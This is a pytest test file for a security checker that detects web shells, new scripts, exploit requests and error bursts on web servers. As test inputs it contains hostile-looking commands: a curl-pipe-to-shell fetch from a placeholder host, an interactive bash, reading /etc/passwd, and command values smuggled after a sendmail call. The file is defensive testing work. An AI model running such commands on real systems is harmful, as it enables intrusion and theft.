"""Web application checks (PR 2.8b, DESIGN.md §8.12)."""

from datetime import timedelta

import pytest
from test_checks import T0, ev, of, run
from test_checks_live import proc, snap

from checker.checks import Context, run_checks
from checker.correlate import find_chains
from checker.snapshot import compare

ACCOUNTS = {"root": {"uid": 0}, "www-data": {"uid": 33}, "jch": {"uid": 1000}}
UNSET = 4294967295


def exec_(minutes, uid, exe, argv, auid=UNSET, success=True, **fields):
    return ev(
        "process.exec",
        minutes,
        source="web_logs:audit",
        uid=uid,
        euid=uid,
        auid=auid,
        exe=exe,
        comm=exe.rsplit("/", 1)[-1],
        argv=argv,
        success=success,
        **fields,
    )


def request(minutes, path, status, network="203.0.113.0/24", **fields):
    return ev(
        "web.request",
        minutes,
        source="web_logs:/var/log/nginx/access.log",
        path=path,
        status=status,
        network=network,
        method="GET",
        **fields,
    )


def history(events, accounts=ACCOUNTS, live=None):
    return of(run(events, snap(live, accounts=accounts)), "web.worker_child")


# --- web.worker_child ---------------------------------------------------------------------


def test_a_web_shell_s_commands_from_the_audit_log():
    events = [
        exec_(1, 33, "/usr/bin/dash", "sh -c id"),
        exec_(1, 33, "/usr/bin/id", "id"),
        exec_(2, 33, "/usr/bin/dash", "sh -c uname -a"),
        exec_(2, 33, "/usr/bin/uname", "uname -a"),
        exec_(3, 33, "/usr/bin/cat", "cat /etc/passwd"),
        exec_(4, 33, "/usr/bin/dash", "sh -c 'curl -s http://x/a | sh'"),
        exec_(5, 33, "/usr/bin/bash", "bash -i"),
    ]
    summaries = [f.summary for f in history(events)]
    assert any(s.startswith("www-data ran uname") for s in summaries)
    assert any(s.startswith("www-data ran id") for s in summaries)
    assert any("curl" in s for s in summaries)
    assert any(s.startswith("www-data ran bash") for s in summaries)
    assert {f.band for f in history(events)} == {"high"}


@pytest.mark.parametrize(
    "event",
    [
        # PHP's own exec() and mail(): a shell, judged by what it was asked.
        exec_(1, 33, "/usr/bin/dash", "sh -c convert a.png b.jpg"),
        exec_(1, 33, "/usr/bin/dash", "sh -c command -v convert"),
        exec_(1, 33, "/usr/bin/dash", "sh -c /usr/sbin/sendmail -t -i -f 'x@y.org'"),
        exec_(1, 33, "/usr/bin/dash", "sh -c /usr/bin/msmtp -t"),
        exec_(1, 33, "/usr/bin/convert", "convert a.png b.jpg"),
        # An administrator's `sudo -u www-data …`, a cron job: their session.
        exec_(1, 33, "/usr/bin/id", "id", auid=1000),
        exec_(1, 33, "/usr/bin/php8.3", "php occ maintenance:mode", auid=33),
        # Someone else's shell; a failed start.
        exec_(1, 1000, "/usr/bin/bash", "bash"),
        exec_(1, 33, "/usr/bin/id", "id", success=False),
    ],
)
def test_ordinary_php_server_work_isn_t_a_finding(event):
    assert history([event]) == []


def test_the_sendmail_exemption_takes_only_options_and_addresses():
    for argv in (
        "sh -c /usr/sbin/sendmail -t; curl x | sh",
        "sh -c /usr/sbin/sendmail -t\n/tmp/k",
        "sh -c /usr/sbin/sendmail -t && id",
    ):
        assert history([exec_(1, 33, "/usr/bin/dash", argv)]), argv


def test_interpreters_are_medium_and_programs_from_scratch_places_high():
    events = [
        exec_(1, 33, "/usr/bin/python3", "python3 -c import pty"),
        exec_(2, 33, "/tmp/.x/kworker", "kworker"),
        exec_(3, 33, "/usr/bin/dash (deleted)", "sh -c id"),
    ]
    found = {f.summary.split(" ran ")[1].split(" ")[0]: f.band for f in history(events)}
    assert found == {"python3": "medium", "kworker": "high", "dash": "high"}


def test_an_attack_among_a_site_s_own_jobs_stays_apart():
    jobs = [exec_(n, 33, "/usr/bin/dash", "sh -c php artisan schedule:run") for n in range(300)]
    attack = [exec_(400, 33, "/usr/bin/dash", "sh -c id")]
    found = history(jobs + attack)
    assert len(found) == 1 and found[0].summary.startswith(
        "www-data ran dash 1 time, e.g. sh -c id"
    )


def test_the_newest_events_are_cited_too():
    events = [exec_(n, 33, "/usr/bin/id", "id") for n in range(120)]
    [found] = history(events)
    cited = [r["event"] for r in found.evidence]
    assert len(cited) == 50 and cited[0] == 0 and cited[-1] == 119


def test_euid_alone_counts():
    event = exec_(1, 1000, "/usr/bin/id", "id")
    event.fields["euid"] = 33
    assert history([event])


def web_proc(pid, comm, ppid=1, uid=33, cgroup="0::/system.slice/php8.3-fpm.service", **kw):
    return proc(pid, comm, ppid=ppid, uids=[uid] * 4, cgroup=cgroup, **kw)


def test_live_children_of_web_workers():
    processes = [
        web_proc(100, "php-fpm8.3", exe="/usr/sbin/php-fpm8.3", uid=0),
        web_proc(101, "sh", ppid=100, exe="/usr/bin/dash", cmdline="sh -c id"),
        # setsid'd away from php-fpm, but still in its service: caught.
        web_proc(102, "bash", exe="/usr/bin/bash", cmdline="bash -i"),
        # A web account's interpreter run by another service (gunicorn): not.
        web_proc(
            200,
            "python3",
            exe="/usr/bin/python3",
            cmdline="gunicorn app",
            cgroup="0::/system.slice/app.service",
        ),
        # A web account's shell in an administrator's session: not.
        proc(300, "sshd", exe="/usr/sbin/sshd", uids=[0, 0, 0, 0]),
        proc(301, "sudo", ppid=300, exe="/usr/bin/sudo", uids=[0, 0, 0, 0]),
        web_proc(
            302,
            "bash",
            ppid=301,
            exe="/usr/bin/bash",
            cmdline="bash",
            cgroup="0::/user.slice/session-4.scope",
        ),
        # The root Apache master's root piped logger: not.
        web_proc(
            400,
            "apache2",
            exe="/usr/sbin/apache2",
            uid=0,
            cgroup="0::/system.slice/apache2.service",
        ),
        web_proc(
            401,
            "sh",
            ppid=400,
            exe="/usr/bin/dash",
            uid=0,
            cmdline="sh -c id",
            cgroup="0::/system.slice/apache2.service",
        ),
        # A deleted shell child: caught by its name.
        web_proc(500, "sh", ppid=100, exe="/usr/bin/dash (deleted)", cmdline="sh -c whoami"),
    ]
    live = {"processes": processes, "sockets": []}
    found = history([], live=live)
    assert sorted(int(f.summary.split("pid ")[1].split(",")[0]) for f in found) == [101, 102, 500]
    assert {f.variant for f in found} == {"live"}


def test_web_accounts_named_at_setup_are_judged_too():
    accounts = dict(ACCOUNTS, shop={"uid": 1500})
    events = [exec_(1, 1500, "/usr/bin/id", "id")]
    assert history(events, accounts) == []
    live = {"processes": [], "sockets": [], "web_accounts": {"names": ["shop", "www-data"]}}
    [found] = history(events, accounts, live)
    assert "account:shop" in found.entities


# --- web.new_script_hit --------------------------------------------------------------------


def script_snapshots(**extra):
    before = snap(web_files={"/var/www/html/index.php": {"type": "-"}, **extra})
    after = snap(
        accounts=ACCOUNTS,
        web_files={
            "/var/www/html/index.php": {"type": "-"},
            "/var/www/html/up/cc-shell.php": {"type": "-", "uid": 33},
            "/var/www/html/notes.txt": {"type": "-"},
            **extra,
        },
    )
    return before, after


def test_requests_answered_by_a_new_script():
    before, after = script_snapshots()
    events = [
        request(1, "/up/cc-shell.php?c=[MASKED:value]", 200),
        request(2, "//up/./cc-shell.php", 200),
        request(3, "/up/cc-shell.php/extra/info", 200),
        request(4, "/up/cc%2Dshell.php", 200),
        request(5, "/up/cc-shell.php", 404),  # not answered
        request(6, "/index.php", 200),  # not new
        request(7, "/notes.txt", 200),  # not a script
    ]
    [found] = of(run(events, after, baseline=before), "web.new_script_hit")
    assert found.summary.startswith("/var/www/html/up/cc-shell.php: 4 requests")
    assert "account:www-data" in found.entities  # the web account that owns it
    assert found.uncertain is None
    assert of(run(events, after), "web.new_script_hit") == []  # no baseline yet


def test_a_second_site_s_same_named_script_is_uncertain():
    before = snap(web_files={"/var/www/a/wp-cron.php": {"type": "-"}})
    after = snap(
        web_files={"/var/www/a/wp-cron.php": {"type": "-"}, "/var/www/b/wp-cron.php": {"type": "-"}}
    )
    [found] = of(
        run([request(1, "/wp-cron.php", 200)], after, baseline=before), "web.new_script_hit"
    )
    assert "another site" in found.uncertain
    assert not [e for e in found.entities if e.startswith("account:")]  # owner unknown


# --- web.exploit ---------------------------------------------------------------------------


def test_attacks_answered_or_refused():
    events = [
        request(1, "/x.php?f=[MASKED:exploit:traversal]", 200, attacks=["traversal"]),
        request(2, "/y?f=[MASKED:exploit:traversal]", 500, attacks=["traversal"]),
        # A front controller or static page ignoring a parameter: refused.
        request(3, "/?f=[MASKED:exploit:traversal]", 200, attacks=["traversal"]),
        request(4, "/z?f=[MASKED:exploit:jndi]", 404, attacks=["jndi"]),
        # User agents: refused, except Shellshock answered by a CGI program.
        request(5, "/", 200, network="198.51.100.0/24", agent_attacks=["jndi"]),
        request(6, "/cgi-bin/status", 200, network="192.0.2.0/24", agent_attacks=["shellshock"]),
    ]
    found = {(f.summary.split(":")[0], f.title): f for f in of(run(events), "web.exploit")}
    answered = found[("203.0.113.0/24", "A traversal attack answered")]
    assert answered.band == "medium" and "2 requests (status 200, 500)" in answered.summary
    assert found[("203.0.113.0/24", "A traversal attack refused")].band == "info"
    assert found[("203.0.113.0/24", "A jndi attack refused")].band == "info"
    assert found[("198.51.100.0/24", "A jndi attack refused")].band == "info"
    assert found[("192.0.2.0/24", "A shellshock attack answered")].band == "medium"
    assert answered.entities == ["address:203.0.113.0/24"]


def test_an_organization_s_own_scanner_can_be_whitelisted_by_network():
    from checker.whitelist import Match, matches

    finding = of(run([request(1, "/x.php?f=a", 200, attacks=["sql"])]), "web.exploit")[0]
    assert matches(Match(check="web.exploit", address="203.0.0.0/16"), finding.as_dict())
    assert not matches(Match(check="web.exploit", address="198.51.100.0/24"), finding.as_dict())


# --- web.errors and web.noise --------------------------------------------------------------


def test_error_bursts_from_one_source():
    burst = [request(n / 10, "/api", 502) for n in range(20)]
    nineteen = [request(n / 10, "/api", 502, network="198.51.100.0/24") for n in range(19)]
    spread = [request(n * 10, "/api", 500, network="192.0.2.0/24") for n in range(30)]
    # Twenty minutes and 1 s apart are two windows; exactly five minutes is one.
    edge = [request(0, "/api", 502, network="100.64.0.0/24") for _ in range(10)]
    edge += [request(5, "/api", 502, network="100.64.0.0/24") for _ in range(10)]
    found = of(run(burst + nineteen + spread + edge), "web.errors")
    assert sorted(f.summary.split(":")[0] for f in found) == ["100.64.0.0/24", "203.0.113.0/24"]


def test_upstream_lines_count_only_without_access_lines():
    access = [request(n / 10, "/api", 502) for n in range(10)]
    upstream = [
        ev("web.error", n / 10, network="203.0.113.0/24", message="upstream timed out")
        for n in range(10)
    ]
    assert of(run(access + upstream), "web.errors") == []  # ten failures, logged twice
    only = [
        ev("web.error", n / 10, network="198.51.100.0/24", message="upstream x") for n in range(20)
    ]
    assert of(run(only), "web.errors")


def test_background_noise_is_one_informational_line():
    live = {
        "processes": [],
        "sockets": [],
        "web_requests": {
            "requests_by_network": {
                "203.0.113.0/24": {"4xx": 40, "2xx": 5},
                "198.51.100.0/24": {"3xx": 2, "4xx": 8},
                "192.0.2.0/24": {"2xx": 100},
            }
        },
    }
    refused_scripts = [
        request(n, "/wp-login.php", 404, network="198.51.100.0/24") for n in range(5)
    ]
    [found] = of(run(refused_scripts, snap(live)), "web.noise")
    assert found.band == "info"
    assert found.summary.startswith("55 refused requests from 2 networks; most from 203.0.113.0/24")
    quiet = {
        "processes": [],
        "sockets": [],
        "web_requests": {"requests_by_network": {"x": {"4xx": 3}}},
    }
    assert of(run([], snap(quiet)), "web.noise") == []


# --- The chain -----------------------------------------------------------------------------


def chain_of(events):
    before, after = script_snapshots()
    context = Context(
        host="web01",
        bundle_id="b2",
        events=list(events),
        snapshot=after,
        baseline_id="b0",
        since_baseline=compare(before, after),
    )
    findings, _ = run_checks(context)
    return find_chains(
        [f.as_dict() for f in findings], events, (T0 - timedelta(hours=1)).isoformat()
    )


def test_a_new_script_then_its_account_s_shell_is_a_chain():
    events = [request(1, "/up/cc-shell.php", 200), exec_(2, 33, "/usr/bin/id", "id")]
    assert [(c["chain"], c["account"]) for c in chain_of(events)] == [
        ("web-shell-used", "www-data")
    ]


@pytest.mark.parametrize(
    "events",
    [
        # The shell came first.
        [exec_(1, 33, "/usr/bin/id", "id"), request(10, "/up/cc-shell.php", 200)],
        # Hours after the script's last request.
        [request(1, "/up/cc-shell.php", 200), exec_(200, 33, "/usr/bin/id", "id")],
        # Another account's shell.
        [request(1, "/up/cc-shell.php", 200), exec_(2, 1000, "/usr/bin/id", "id")],
    ],
)
def test_no_chain_out_of_order_too_late_or_another_account(events):
    assert chain_of(events) == []


def test_a_web_server_started_by_hand_keeps_its_shells_judged():
    # An administrator (UID 1000) started php-fpm from their session: its
    # workers, and all they start, carry login UID 1000.
    live = {
        "processes": [web_proc(100, "php-fpm8.3", exe="/usr/sbin/php-fpm8.3", loginuid=1000)],
        "sockets": [],
    }
    shell = exec_(1, 33, "/usr/bin/id", "id", auid=1000)
    assert history([shell], live=live)
    assert history([shell]) == []  # without such a worker: the administrator's own
